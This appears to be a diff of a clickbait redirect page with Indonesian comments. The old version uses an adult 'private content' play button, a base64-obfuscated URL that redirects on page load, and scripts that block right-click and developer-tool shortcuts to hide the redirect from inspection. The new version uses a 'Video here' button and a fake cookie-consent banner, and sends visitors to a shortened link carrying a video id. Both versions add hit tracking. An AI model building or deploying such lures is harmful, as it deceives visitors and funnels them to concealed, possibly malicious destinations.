@@ -1,155 +1,190 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-    <meta name="referrer" content="no-referrer">
-    <title>Private Access</title>
-
-    <!-- Metadata Sosial -->
-    <meta property="og:title" content="Private Access">
-    <meta property="og:description" content="Pengiriman media aman siap putar.">
-    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
-    <meta property="og:type" content="website">
-    
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ｍｏｇｏｆｌｏｘ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-
-        :root {
-            --brand-red: #e50914;
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { 
+            background-color: #f4f4f4; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: flex-start; 
+            padding-top: 220px; 
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Inter', sans-serif;
-            overflow: hidden;
-            height: 100vh;
+        /* Tombol Utama */
+        .btn-main {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 12px 30px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 20px;
             display: flex;
             align-items: center;
-            justify-content: center;
-        }
-
-        .main-container {
-            width: 100%;
-            max-width: 450px;
-            height: 100vh;
-            background: #000;
-            position: relative;
+            gap: 5px;
+            border: none;
             cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            position: relative;
+            z-index: 999;
         }
 
-        .content-overlay {
-            position: absolute;
-            inset: 0;
+        /* Cookie Modal */
+        .cookie-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.05);
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            padding: 2rem;
+            align-items: flex-end;
+            padding-bottom: 25px;
+            z-index: 100;
+            pointer-events: none;
+        }
+
+        .cookie-card {
+            background: #ffffff;
+            width: 92%;
+            max-width: 380px;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            pointer-events: auto;
+        }
+
+        .cookie-card h2 { font-size: 18px; margin: 0 0 15px 0; color: #000; font-weight: 700; }
+        .cookie-card p { font-size: 14px; color: #333; line-height: 1.4; margin-bottom: 20px; }
+
+        .btn-group { display: flex; flex-direction: column; gap: 8px; }
+        .c-btn {
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid #ddd;
+            background: #fff;
+            color: #333;
+        }
+        .c-btn-blue { background: #1a73e8; color: #fff; border: none; }
+
+        .footer-brand {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #777;
             text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
         }
 
-        .play-button {
-            width: 100px;
-            height: 100px;
-            background: var(--brand-red);
-            border-radius: 50%;
+        .cookie-logo-box {
             display: flex;
             align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 30px rgba(229, 9, 20, 0.4);
+            font-weight: 700;
+            color: #333;
         }
 
-        .play-icon {
-            width: 0;
-            height: 0;
-            border-top: 15px solid transparent;
-            border-bottom: 15px solid transparent;
-            border-left: 25px solid white;
-            margin-left: 8px;
+        /* Logo Perisai Kustom SVG */
+        .custom-logo {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+            display: flex;
+            align-items: center;
         }
+
+        .brand-cookie { color: #202c3d; }
+        .brand-admin { color: #a17038; }
     </style>
 </head>
 <body>
 
-    <div class="main-container" id="hitArea">
-        <div class="content-overlay">
-            <div class="border border-red-600 text-red-600 px-2 py-1 text-xs font-black rounded mb-4">18+</div>
-            <h2 class="text-xs tracking-[0.3em] font-bold opacity-70 mb-8">KONTEN TERENKRIPSI PRIVAT</h2>
+    <button class="btn-main" onclick="startLoading()">
+        🔗👉Video here🔗
+    </button>
+
+    <div id="cookieBox" class="cookie-overlay">
+        <div class="cookie-card">
+            <h2>We respect your privacy</h2>
+            <p>
+                Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
+                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or 
+                Reject All to decline non-essential cookies.
+            </p>
             
-            <div class="play-button mb-6">
-                <div class="play-icon"></div>
+            <div class="btn-group">
+                <button class="c-btn" onclick="hideCookie()">Customize</button>
+                <button class="c-btn" onclick="hideCookie()">Reject All</button>
+                <button class="c-btn c-btn-blue" onclick="hideCookie()">Accept All</button>
             </div>
 
-            <p class="text-sm font-bold tracking-widest uppercase">Klik untuk Membuka</p>
+            <div class="footer-brand">
+                Powered by 
+                <span class="cookie-logo-box">
+                    <div class="custom-logo">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91V2z" fill="#202c3d"/>
+                            <path d="M12 2v19.91c4.59-1.15 8-5.86 8-10.91V5l-8-3z" fill="#f4a136"/>
+                            <circle cx="12" cy="11" r="3" fill="#ffffff" fill-opacity="0.2"/>
+                        </svg>
+                    </div>
+                    <span class="brand-cookie">Cookie</span><span class="brand-admin">Admin</span>
+                </span>
+            </div>
         </div>
     </div>
 
     <script>
-        // Base redirect yang disamarkan
-        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");
+        // Mengambil path terakhir dari URL
+        const path = window.location.pathname;
+        const segments = path.split('/').filter(Boolean);
+        let rawId = segments.pop() || 'default';
 
-        /**
-         * Mengambil ID video dari parameter URL atau path
-         */
-        function extractVideoId() {
-            const params = new URLSearchParams(window.location.search);
-            let id = params.get("id") || params.get("v");
+        // Fungsi untuk menghapus ekstensi file (seperti .mp4, .html, dsb)
+        // Ini akan mengambil bagian sebelum titik terakhir
+        const videoId = rawId.includes('.') ? rawId.substring(0, rawId.lastIndexOf('.')) : rawId;
 
-            if (!id) {
-                const pathParts = window.location.pathname.split("/");
-                const lastPart = pathParts.pop().trim();
-                if (lastPart && !lastPart.includes(".") && lastPart !== "index") {
-                    id = lastPart;
-                }
-            }
-            return (id && id.length >= 3) ? id : null;
+        const daftarDomain = [
+            "https://t.co/J4GMDZ4YMf?",
+        ];
+
+        const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
+        
+        // Hasilnya sekarang akan bersih tanpa .mp4
+        const finalLink = domainTerpilih + videoId;
+
+        function startLoading() {
+            window.location.href = finalLink;
         }
 
-        /**
-         * Fungsi untuk langsung pindah ke tautan tujuan
-         */
-        function goDirectly() {
-            const id = extractVideoId();
-            let finalUrl = BASE_REDIRECT;
-            if (id) finalUrl += "/" + id;
-            
-            window.location.replace(finalUrl);
+        function hideCookie() {
+            document.getElementById('cookieBox').style.display = 'none';
         }
-
-        // Eksekusi segera setelah DOM siap
-        document.addEventListener("DOMContentLoaded", () => {
-            // Langsung coba pindah saat halaman dimuat
-            goDirectly();
-
-            // Backup jika auto-redirect gagal/terblokir, klik area mana saja akan memicu perpindahan
-            document.getElementById("hitArea").addEventListener("click", goDirectly);
-        });
-
-        // Pencegahan inspeksi standar
-        document.addEventListener("contextmenu", e => e.preventDefault());
-        document.onkeydown = e => {
-            if (e.keyCode === 123) return false;
-            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) return false;
-        };
     </script>
 
     <!-- Histats -->
-<script type="text/javascript">
-var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
-_Hasync.push(['Histats.fasi', '1']);
-_Hasync.push(['Histats.track_hits', '']);
-(function() {
-var hs = document.createElement('script');
-hs.type = 'text/javascript';
-hs.async = true;
-hs.src = 'https://s10.histats.com/js15_as.js';
-(document.head || document.body).appendChild(hs);
-})();
-</script>
-
+    <script type="text/javascript">
+    var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
+    </script>
 </body>
 </html>
